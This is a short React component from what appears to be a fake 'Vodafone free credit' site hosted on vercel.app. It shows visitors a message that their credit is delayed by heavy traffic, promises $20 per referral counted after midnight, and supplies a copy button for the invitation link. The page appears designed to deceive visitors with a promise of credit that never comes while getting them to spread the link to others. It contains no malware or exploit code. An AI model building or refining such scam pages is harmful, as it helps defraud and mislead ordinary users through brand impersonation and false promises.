// /src/components/ApprovalNotice.jsx
import { useState } from 'react';

const REFERRAL_LINK = 'https://vodafonefreecredit.vercel.app';

export default function ApprovalNotice() {
  const [copied, setCopied] = useState(false);
  async function copy() {
    try { await navigator.clipboard.writeText(REFERRAL_LINK); setCopied(true); setTimeout(() => setCopied(false), 1500); } catch {}
  }

  return (
    <div className="mt-4">
      <p>
        Dear user, due to heavy traffic on the website, your credit will be sent within the next few hours.
        Your invitation link is <strong>{REFERRAL_LINK.replace('https://','')}</strong>.
        Each referral grants you $20 in free credit. Referrals are counted after 00:00.
      </p>
      <div className="flex items-center gap-2 mt-2">
        <input value={REFERRAL_LINK} readOnly className="w-full px-3 py-2 rounded border" />
        <button onClick={copy} className="px-3 py-2 rounded border">{copied ? 'Copied' : 'Copy'}</button>
      </div>
    </div>
  );
}
